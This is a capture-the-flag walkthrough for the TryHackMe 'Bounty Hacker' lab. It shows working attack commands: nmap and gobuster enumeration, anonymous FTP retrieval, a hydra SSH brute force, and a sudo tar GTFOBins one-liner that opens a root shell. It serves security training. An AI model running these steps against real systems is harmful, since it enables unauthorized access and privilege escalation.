## THM CTF - Bounty Hacker

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   bounty.thm
```
Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 bounty.thm -p-
```
We discovered three open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 bounty.thm -p21,22,80 -sV
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
It's time to visit the site on ```port 80``` and to start a directory enumeration.

We found nothing special in the main page code, except for the ```images``` folder.
```
gobuster dir -u http://bounty.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,json,log,db,html
```
Same result with ```Gobuster```.

Better check another service for now.
```
sudo nmap -sS -T4 bounty.thm -p21,22,80 -sV -sC
```
We discover that ```FTP``` service allow anonymous access.
```
ftp bounty.thm
anonymous
```
But while checking for files with ls command, the service enter in an ```extended passive mode```.

After conducting some research, we can disable this mode by executing the following command.
```
passive
```
We continue using it until we receive the response.
```
Passive mode: off; fallback to active mode: off.
```
Now we can easly discover and download two files.

In the ```task.txt``` file we can find the answer to the task.

We found another file in the ```FTP``` folder named ```locks.txt```.

We can try to use it to brute force the ```SSH``` service.
```
hydra -vV -l lin -P locks.txt bounty.thm ssh
```
We are able to find valid credentials that can be used to answer our questions.

Logging in the SSH service we are able to find the file and the flag contained in it.
```
ssh lin@bounty.thm
```
Having ```lin``` password we can try
```
sudo -l
```
Discovering that ```lin``` can use tar with sudo privileges.

Thanks to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) we discover a command line to obtain a ```root shell```.
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Capturing the last flag.

